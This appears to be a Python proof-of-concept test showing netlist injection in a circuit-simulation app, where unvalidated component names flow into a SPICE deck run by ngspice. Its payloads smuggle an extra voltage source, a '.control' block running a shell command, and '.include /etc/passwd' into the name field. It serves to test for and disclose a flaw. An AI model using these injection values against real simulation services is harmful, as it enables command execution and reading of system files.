"""Netlist injection through a hand-edited file: component *names* are not validated and go verbatim into the
SPICE deck sent to ngspice. Payloads: extra device line; .control/shell (writes a marker file in a temp dir)."""
import sys, os, json, tempfile
sys.path.insert(0, ".")
from app.model import Document
from app.sim import run_document

tmp = tempfile.mkdtemp(); marker = os.path.join(tmp, "PWNED")
base = Document.led_example().to_dict()


def with_name(name):
    d = json.loads(json.dumps(base))
    d["components"][name] = d["components"].pop("R1"); d["layout"][name] = d["layout"].pop("R1")
    d["connections"] = [[c.replace("R1.", name + ".") for c in w] for w in d["connections"]]
    p = os.path.join(tmp, "inj.json"); json.dump(d, open(p, "w")); return Document.load(p)


for label, name in [
        ("extra 100V source", "R1 n1 n2 330\nV9 n1 0 DC 100\nRX"),
        ("comment out", "R1 n1 n2 1e9 ;"),
        ("control shell", f"R1 n1 n2 330\n.control\nshell touch {marker}\n.endc\nRX"),
        ("include", "R1 n1 n2 330\n.include /etc/passwd\nRX")]:
    doc = with_name(name)
    r = run_document(doc)
    deck = r.details.split("--- netlist sent to the core ---")[-1].strip().splitlines() if "netlist" in r.details else []
    print(f"[{label}] ok={r.ok} msg={r.message[:120]!r}")
    if r.ok: print("   I(D1) final:", r.stats("I(D1)")["final"], " (honest circuit: 9.18e-3)")
    for l in deck[:12]: print("   deck>", l)
print("marker file created (shell executed):", os.path.exists(marker))
